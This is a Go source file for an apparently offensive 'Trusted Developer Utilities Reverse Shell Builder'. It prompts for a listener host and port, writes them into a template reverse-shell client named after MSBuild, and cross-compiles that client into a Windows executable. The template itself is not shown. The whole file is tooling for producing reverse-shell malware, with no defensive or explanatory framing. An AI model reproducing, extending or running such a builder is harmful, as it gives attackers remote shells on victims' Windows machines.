package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/fatih/color"
)

func main() {

	var lhost, lport, agentname string
	//redc := color.New(color.FgHiRed, color.Bold)
	//greenc := color.New(color.FgHiGreen, color.Bold)

	cyanc := color.New(color.FgCyan, color.Bold)
	yellowc := color.New(color.FgHiYellow, color.Bold)
	yellowc.Printf("\t\t\t\t ______________________________________________________\n")
	yellowc.Printf("\t\t\t\t| Trusted Developer Utilities Reverse Shell Builder    |\n")
	yellowc.Printf("\t\t\t\t ------------------------------------------------------\n\n")

	cyanc.Printf("SET LHOST >> ")
	reader := bufio.NewReader(os.Stdin)
	lhost, _ = reader.ReadString('\n')
	lhost = strings.TrimSuffix(lhost, "\r\n")

	cyanc.Printf("SET LPORT >> ")
	reader = bufio.NewReader(os.Stdin)
	lport, _ = reader.ReadString('\n')
	lport = strings.TrimSuffix(lport, "\r\n")

	cyanc.Printf("Save TDU Reverse Shell as >> ")
	reader = bufio.NewReader(os.Stdin)
	agentname, _ = reader.ReadString('\n')
	agentname = strings.TrimSuffix(agentname, "\r\n")

	updatetemplate("basefiles/msbuildClient.go", "download/msbuildClient.go", lhost, lport)
	buildexe("download/"+agentname, "download/msbuildClient.go")
	os.Remove("download/msbuildClient.go")

	//updatetemplate("basefiles/butymanager.go", "basefiles/butymanager.go", lport, butymngrpvtkey, butyclientpubkey)
	//buildexe("download/butymanager.exe", "basefiles/butymanager.go")
	//os.Remove("download/butymanager.go")
	//os.Remove("download/msbuildclient.go")
}

func updatetemplate(basefilepath, outfilepath, lhost, lport string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "RHOST") {
			str = strings.Replace(str, "RHOST", lhost, 1)
		}
		if strings.Contains(str, "RPORT") {
			str = strings.Replace(str, "RPORT", lport, 1)
		}

		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func copyfile(sourcepath, destpath string) {
	srcpubkfile, err := os.Open(sourcepath)
	if err != nil {
		fmt.Println(err)
	}
	defer srcpubkfile.Close()
	newpubkFile, err := os.Create(destpath)
	if err != nil {
		fmt.Println(err)
	}
	defer newpubkFile.Close()

	scanner := bufio.NewScanner(srcpubkfile)
	for scanner.Scan() {
		str := scanner.Text()

		newpubkFile.WriteString(str + "\n")
	}

	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func buildmanger(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath+".exe", gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}

func buildexe(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath+".exe", gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Build Success !")
		}
	}
}
